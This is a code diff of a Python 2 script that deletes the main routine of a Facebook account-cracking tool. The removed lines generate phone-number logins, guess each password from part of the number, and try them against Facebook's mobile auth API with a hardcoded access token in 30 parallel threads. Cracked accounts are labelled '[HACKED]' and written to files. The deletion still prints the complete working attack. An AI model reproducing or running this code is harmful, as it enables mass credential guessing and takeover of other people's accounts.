@@ -237,56 +237,7 @@ def action():
     else:
         print '[!] Fill in correctly'
         action()
-    print '\x1b[1;90m======================================================>>'
-    xxx = str(len(id))
-    psb('\x1b[1;92m[\xe2\x9c\x94] Total Numbers: ' + xxx)
-    time.sleep(0.5)
-    psb('\x1b[1;93m[\xe2\x9c\x93]\x1b[1;93m Please wait, process is running ...')
-    time.sleep(0.5)
-    psb('\x1b[1;96m[!] To Stop Process Press CTRL Then Press z')
-    time.sleep(0.5)
-    print '\x1b[1;90m=======================================================>>'
-
-    def main(arg):
-        user = arg
-        try:
-            os.mkdir('save')
-        except OSError:
-            pass
-
-        try:
-            result = k + c + user
-            digi7 = result[7:14]
-            pass1 = digi7
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;92m[HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
-                okb.write(k + c + user + '|' + pass1 + '\n')
-                okb.close()
-                oks.append(c + user + pass1)
-            elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;96m[MAHADI] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Open After 15 Days]\n'
-                cps = open('save/checkpoint.txt', 'a')
-                cps.write(k + c + user + '|' + pass1 + '\n')
-                cps.close()
-                cpb.append(c + user + pass1)
-        except:
-            pass
-
-    p = ThreadPool(30)
-    p.map(main, id)
-    print 48 * '-'
-    print 'Process Has Been Completed ...'
-    print 'Total OK : ' + str(len(oks))
-    print 'Total CP : ' + str(len(cpb))
-    print 47 * '-'
-    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
-    jalan('Note : Your Offline account Will Open after 10 to 15 days')
-    raw_input('\n\x1b[1;92m[\x1b[1;98mSH_menu_Back\x1b[1;95m]')
-    login()
-
+    
 
 if __name__ == '__main__':
     menu()
